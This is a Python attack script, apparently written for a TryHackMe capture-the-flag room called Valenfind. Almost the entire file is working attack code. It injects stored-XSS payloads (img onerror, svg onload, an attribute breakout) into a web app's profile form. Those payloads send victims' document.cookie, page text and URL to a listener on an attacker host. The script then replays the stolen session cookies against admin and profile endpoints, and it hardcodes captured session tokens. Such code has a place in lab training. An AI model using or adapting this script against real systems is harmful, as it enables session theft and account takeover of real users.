#!/usr/bin/env python3
"""Valenfind end-to-end XSS flow (no parameters).

Run it as-is on attacker machine:
  python owasp_hunt/valenfind_xss_listener_replay.py

What it does:
1) Starts a local listener for cookie exfil at /steal?d=...
2) Seeds /complete_profile with stored-XSS payload using known cookies
3) Waits for stolen cookie callbacks
4) Replays stolen session against useful endpoints and searches for THM{...}
"""

from __future__ import annotations

import html
import http.server
import random
import re
import socketserver
import string
import threading
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple

import requests


BASE_URL = "http://10.112.165.127:5000"
COOKIE_NAME = "session"
COOKIE_VALUES = [
    "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw",
    ".eJwljEEKwjAUBa_yfesiqCu78wbupZRP-qrBpCn5yaKU3t2Aq5nZzI5xDmofGvrXDikNiDTTN9Hh4VyqSxGXqYXTSZ6BahSX4hpYKFuqWdacZh94xnAMHYL_cmqbptWYR9_i_vdFI9Hjcr3h-AEITyjz.aeFLFA.qlotgrsCHcBudjmxf4eS5QO9y1A",
]
ATTACKER_HOST = "10.112.69.178"
LISTEN_PORT = 8000
WAIT_SECONDS = 180
TIMEOUT = 12
FLAG_RE = re.compile(r"THM\{[^}]+\}", re.I)


class Loot:
    def __init__(self) -> None:
        self.event = threading.Event()
        self.hits: List[str] = []


LOOT = Loot()


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urllib.parse.urlsplit(self.path)
        if parsed.path == "/steal":
            LOOT.hits.append(self.path)
            LOOT.event.set()
            src = f"{self.client_address[0]}:{self.client_address[1]}"
            qs = urllib.parse.parse_qs(parsed.query)
            d = qs.get("d", [""])[0]
            c = urllib.parse.unquote_plus(d) if d else ""
            print(f"[listener] hit from {src}")
            print(f"[listener] raw d: {(c if c else '<empty>')[:200]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt: str, *args) -> None:
        return


def start_listener() -> socketserver.TCPServer:
    server = socketserver.ThreadingTCPServer(("0.0.0.0", LISTEN_PORT), Handler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


def self_test_listener() -> bool:
    test_url = f"http://127.0.0.1:{LISTEN_PORT}/steal?d=selftest"
    try:
        r = requests.get(test_url, timeout=5)
    except Exception as exc:
        print(f"[selftest] failed: {exc}")
        return False

    ok = r.status_code == 200 and any("selftest" in urllib.parse.unquote_plus(h) for h in LOOT.hits)
    print(f"[selftest] GET /steal -> {r.status_code}, received={ok}")
    return ok


def marker() -> str:
    return "VFX_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def parse_fields_and_hidden_inputs(body: str) -> Tuple[List[str], Dict[str, str]]:
    fields: List[str] = []
    hidden: Dict[str, str] = {}

    for m in re.finditer(r"<input[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if not name_m:
            continue
        name = name_m.group(1)
        fields.append(name)

        type_m = re.search(r"type\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if type_m and type_m.group(1).lower() == "hidden":
            value_m = re.search(r"value\s*=\s*['\"]([^'\"]*)['\"]", tag, flags=re.I)
            hidden[name] = value_m.group(1) if value_m else ""

    for m in re.finditer(r"<textarea[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if name_m:
            fields.append(name_m.group(1))

    dedup: List[str] = []
    seen = set()
    for f in fields:
        if f not in seen:
            seen.add(f)
            dedup.append(f)

    return dedup, hidden


def build_payload() -> str:
    return (
        "<img src=x onerror=\""
        "var c=document.cookie||'nocookie';"
        "var t=(document.body&&document.body.innerText?document.body.innerText:'').slice(0,220);"
        "(new Image).src='http://"
        + ATTACKER_HOST
        + ":"
        + str(LISTEN_PORT)
        + "/steal?d='+encodeURIComponent(c)+'&t='+encodeURIComponent(t)+'&u='+encodeURIComponent(location.href)"
        "\">"
    )


def build_payload_variants() -> List[str]:
    # Multiple variants increase success across different HTML rendering contexts.
    base = (
        "var c=document.cookie||'nocookie';"
        "var t=(document.body&&document.body.innerText?document.body.innerText:'').slice(0,220);"
        f"(new Image).src='http://{ATTACKER_HOST}:{LISTEN_PORT}/steal?d='+encodeURIComponent(c)+'&t='+encodeURIComponent(t)+'&u='+encodeURIComponent(location.href)"
    )
    return [
        f"<img src=x onerror=\"{base}\">",
        f"<svg onload=\"{base}\"></svg>",
        f"\"><img src=x onerror=\"{base}\">",
    ]


def build_profile_data(fields: List[str], hidden: Dict[str, str], payload: str, mk: str) -> Dict[str, str]:
    data = dict(hidden)

    if not fields:
        fields = ["real_name", "email", "phone", "home_address", "bio"]

    for name in fields:
        if name in hidden:
            continue
        nl = name.lower()
        if "mail" in nl:
            data[name] = f"{mk.lower()}@example.com"
        elif "phone" in nl or "tel" in nl:
            data[name] = "123456789"
        else:
            data[name] = f"{payload} {mk}"

    return data


def seed_payload(cookie_value: str, label: str) -> None:
    s = requests.Session()
    s.cookies.set(COOKIE_NAME, cookie_value)

    complete_url = f"{BASE_URL}/complete_profile"
    profile_url = f"{BASE_URL}/my_profile"

    r0 = s.get(complete_url, timeout=TIMEOUT, allow_redirects=True)
    fields, hidden = parse_fields_and_hidden_inputs(r0.text)

    print(f"[{label}] GET complete_profile -> {r0.status_code}")
    payloads = build_payload_variants()

    for idx, p in enumerate(payloads, start=1):
        mk = marker()
        data = build_profile_data(fields, hidden, p, mk)
        rp = s.post(complete_url, data=data, timeout=TIMEOUT, allow_redirects=True)
        rg = s.get(profile_url, timeout=TIMEOUT, allow_redirects=True)

        reflected = mk in html.unescape(rg.text) or mk in re.sub(r"<[^>]+>", " ", rg.text)
        print(f"[{label}] variant-{idx} POST complete_profile -> {rp.status_code}")
        print(f"[{label}] variant-{idx} GET my_profile -> {rg.status_code}")
        print(f"[{label}] variant-{idx} marker reflected -> {reflected}")


def parse_hit(path_with_query: str) -> Tuple[str, str, str]:
    parsed = urllib.parse.urlsplit(path_with_query)
    qs = urllib.parse.parse_qs(parsed.query)
    d = urllib.parse.unquote_plus(qs.get("d", [""])[0])
    t = urllib.parse.unquote_plus(qs.get("t", [""])[0])
    u = urllib.parse.unquote_plus(qs.get("u", [""])[0])
    return d, t, u


def extract_session_from_raw_cookie(raw_value: str) -> Optional[str]:
    decoded = urllib.parse.unquote_plus(raw_value)

    if decoded.strip().lower() == "selftest":
        return None

    # Common format: "k1=v1; session=...; k2=v2"
    m = re.search(r"(?:^|;\s*)session=([^;]+)", decoded, flags=re.I)
    if m:
        return m.group(1).strip()

    # Fallback: if only raw token was sent, treat as candidate.
    if len(decoded) > 20 and "=" not in decoded:
        return decoded.strip()

    return None


def replay_session(session_value: str) -> List[str]:
    s = requests.Session()
    s.cookies.set(COOKIE_NAME, session_value)

    paths = [
        "/",
        "/my_profile",
        "/complete_profile",
        "/admin",
        "/dashboard",
        "/profile",
    ]

    found_flags: List[str] = []
    for path in paths:
        url = f"{BASE_URL}{path}"
        try:
            r = s.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception as exc:
            print(f"[replay] {path} error: {exc}")
            continue

        flags = FLAG_RE.findall(r.text)
        print(f"[replay] GET {path} -> {r.status_code}, flags={len(flags)}")
        if flags:
            for f in flags:
                if f not in found_flags:
                    found_flags.append(f)

    return found_flags


def main() -> None:
    print("Valenfind XSS listener + replay started")
    print(f"Target: {BASE_URL}")
    print(f"Listener: 0.0.0.0:{LISTEN_PORT}")
    print(f"Callback expected at: http://{ATTACKER_HOST}:{LISTEN_PORT}/steal?d=...")
    print("=" * 72)

    server = start_listener()
    print("[listener] running")
    self_test_listener()

    try:
        for i, cookie_value in enumerate(COOKIE_VALUES, start=1):
            seed_payload(cookie_value, f"seed-{i}")
            print("-" * 72)

        print(f"[wait] waiting up to {WAIT_SECONDS}s for cookie callbacks...")
        LOOT.event.wait(timeout=WAIT_SECONDS)

        if not LOOT.hits:
            print("[result] no callback captured yet")
            return

        print(f"[result] captured callbacks: {len(LOOT.hits)}")
        unique_sessions: List[str] = []
        callback_flags: List[str] = []

        for hit in LOOT.hits:
            d, t, u = parse_hit(hit)
            if d.strip().lower() == "selftest":
                continue
            print(f"[callback] d={(d if d else '<empty>')[:80]} | u={(u if u else '<none>')[:120]}")
            if d.strip().lower() == "nocookie":
                print("[callback] JS executed, but document.cookie is empty (likely HttpOnly session)")

            for sample in [d, t, hit]:
                for flg in FLAG_RE.findall(sample):
                    if flg not in callback_flags:
                        callback_flags.append(flg)

            s = extract_session_from_raw_cookie(d)
            if s and s not in unique_sessions:
                unique_sessions.append(s)

        if callback_flags:
            print(f"[callback] FLAGS in exfil data: {', '.join(callback_flags)}")

        if not unique_sessions:
            print("[result] callbacks captured but no session token parsed")
            return

        for i, session_value in enumerate(unique_sessions, start=1):
            print("=" * 72)
            print(f"[replay] testing stolen session #{i}: {session_value[:48]}...")
            flags = replay_session(session_value)
            if flags:
                print(f"[replay] FLAGS: {', '.join(flags)}")
            else:
                print("[replay] no flags found with this session")

    finally:
        server.shutdown()
        server.server_close()
        print("[listener] stopped")


if __name__ == "__main__":
    main()
